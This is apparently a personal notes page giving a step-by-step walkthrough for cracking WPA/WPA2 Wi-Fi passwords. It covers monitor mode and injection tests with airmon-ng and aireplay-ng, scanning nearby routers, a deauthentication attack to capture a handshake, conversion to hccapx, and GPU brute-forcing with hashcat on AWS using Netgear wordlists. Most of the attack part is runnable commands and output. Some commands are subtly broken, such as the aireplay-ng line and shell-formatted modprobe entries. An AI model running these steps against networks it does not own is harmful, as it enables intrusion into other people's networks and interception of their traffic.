---

layout: page

title: Security

permalink: /security/

parent: Miscellaneous

nav_order: 11

---

  # 1. Check if you card supports monitor mode and packet injection
  Here is a list of NIC's that supports monitor mode [Existing Linux Wireless drivers](https://wireless.wiki.kernel.org/en/users/drivers) To know which type of chipset inside your wireless NIC, you can run :
  
  ```bash
lsusb -vv

Bus 001 Device 002: ID 148f:5372 Ralink Technology, Corp. RT5372 Wireless Adapter
Device Descriptor:
  bLength                18
  bDescriptorType         1
  bcdUSB               2.00
  bDeviceClass            0 (Defined at Interface level)
  bDeviceSubClass         0
  bDeviceProtocol         0
  bMaxPacketSize0        64
  idVendor           0x148f Ralink Technology, Corp.
  idProduct          0x5372 RT5372 Wireless Adapter
  bcdDevice            1.01
  iManufacturer           1 Ralink
  iProduct                2 802.11 n WLAN
  iSerial                 3 (error)
  bNumConfigurations      1
```
  
  In order to put your card in monitor mode, first you need to get the name of your wireless card by running **ifconfig**, for example, my wireless card is named **wlan0**, then you can put your card in you can run:
  
  ```bash
airmon-ng start wlan0

Found 3 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to run 'airmon-ng check kill'

  PID Name
  428 NetworkManager
  522 dhclient
  718 wpa_supplicant

PHY	Interface	Driver		Chipset

phy1	wlan0		rt2800usb	Ralink Technology, Corp. RT5372

		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)
```

By running **iwconfig** , you should see that your card has changed from **wlan0** -> **wlan0mon**
  
  To test the package injection, try by running
  
  ```bash
aireplay-ng --test wlan0mon

12:47:05  Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE) on channel 7
12:47:05  Trying broadcast probe requests...
12:47:06  Injection is working!
12:47:07  Found 1 AP

12:47:07  Trying directed probe requests...
12:47:07  AA:BB:CC:DD:EE - channel: 7 - 'Dobis'
12:47:08  Ping (min/avg/max): 0.891ms/15.899ms/32.832ms Power: -21.72
12:47:08  29/30:  96%
```

# 2. Listen to nearby routers. 
**Kill any processes that return errors.** In some cases, your Wi-Fi card will conflict with running services on your computer. You can kill these processes by entering the following command: 

```bash
airmon-ng check kill
```

To get a list of all routers in range, enter the following command:

```bash
airodump-ng wlan0mon 
```

![Image1](https://www.wikihow.com/images/thumb/c/c5/6560850-21.jpg/aid6560850-v4-728px-6560850-21.jpg.webp)


**Make sure the router is using WPA or WPA2 security.**

**Note the MAC address and channel number of the router.** These pieces of information are to the left of the network's name:

-   _MAC address_ — This is the line of numbers on the far-left side of your router's line.
-   _Channel_ — This is the number (e.g., 0, 1, 2, etc.) directly to the left of the WPA or WPA2 tag

## Extra commands

```$ sudo aireplay-ng --test wlan0mon```
```$ sudo besside-ng wlan0mon -R 'RouterName'```

# 3. Monitor your selected network for a handshake.

```$ sudo aireplay-ng -0 10 -a 9X:XX:XX:XX:XX:X5 -w /root/Desktop/ wlan0mon```

Wait for a handshake to appear.
![Image](https://www.wikihow.com/images/thumb/6/6d/6560850-25.jpg/aid6560850-v4-728px-6560850-25.jpg.webp)

Press **ctrl + c** once the handshake appears. To restore your wlan:

```
	$ ifconfig
	
	$ sudo airmon-ng stop wlan0
   
   	$ sudo ifconfig wlan0 up
```

Now we need to convert the capture file to **hccapx**  by using **hashcat-util

```
	$ git clone https://github.com/hashcat/hashcat-utils.git
	$  cd hashcat-utils/src
	$ make
	$ sudo mv *.bin/usr/local/bin/
	$ sudo mv *.bin /usr/local/bin/
	$ sudo cp -a *.pl /usr/local/bin
  
	$ cap2hccapx.bin name.cap output.name.hccapx 
	
```
	
   
# 4. Using hashcat

## Environment
- I will spin up any Ubuntu EC2 instance, with enough GPU (**g3s.xlarge** or **p3.16xlarge** ) power to use hashcat and run the following commands:

```
	$ sudo apt-get update
	$ sudo apt-get install -y linux-image-extra-virtual build-essential linux-headers-$(uname -r) p7zip-full
```

```
	$ blacklist nouveau
	$ blacklist lbm-nouveau  
	$ options nouveau modeset=0  
	$ alias nouveau off  
	$ alias lbm-nouveau off
```

- Add the following to /etc/modprobe.d/nouveau-kms.conf :

		options nouveau modeset=0

- Update the boot process and reboot:

		sudo update-initramfs -u  
		sudo reboot

- Download and install the NVIDIA package:

		$ wget http://us.download.nvidia.com/tesla/440.33.01/NVIDIA-Linux-x86_64-440.33.01.run  
		$ sudo /bin/bash NVIDIA-Linux-x86_64-440.33.01.run --ui=none --no-questions --silent -X

- Test the installation:

		sudo nvidia-smi

![Image3](https://akimbocore.com/article/image/42706d9a-fbd3-457d-8c1c-ce0ba6006d1b/d6e6d288-b536-4f5f-932f-9aaef6b391f6/)

- Download and extract Hashcat:

		$ wget https://hashcat.net/files/hashcat-6.2.4.7z
  
		$ 7za x hashcat-6.2.4.7z
		
- Benchmark your hardware by running:

		$ ./hashcat64.bin -m 2500 -b
		
## Commands
- First I will cp the file ***output.name.hccapx*** into the EC2 instance. Also I will install **hashcat-utils** in order to use combinator.bin utility.
-  Because my router is natgear, I will use the following 3 dictionaries (adjectives + nouns + numbers):

		$  git clone https://github.com/LivingInSyn/netgear_hashcat_wordlist.git
  
  
  		$ combinator3.bin wordlists/adjectives.txt wordlists/nouns.txt wordlists/numbers.txt | hashcat -m 2500 -o resultFile.txt ~/Desktop/output-03.name.hccapx 

# Links

- [How to install Hashcat on AWS](https://akimbocore.com/article/hashcracking-with-aws/)
- [How to Hack WPA/WPA2 Wi Fi with Kali Linux](https://www.wikihow.com/Hack-WPA/WPA2-Wi-Fi-with-Kali-Linux)
- [Dictionaries for Netgear for Hashcat](https://github.com/LivingInSyn/netgear_hashcat_wordlist)
- [Test if Wireless card supports monitor mode and packet injection](https://null-byte.wonderhowto.com/how-to/check-if-your-wireless-network-adapter-supports-monitor-mode-packet-injection-0191221/)
- [Hashcat tutorial](https://resources.infosecinstitute.com/topic/hashcat-tutorial-beginners/)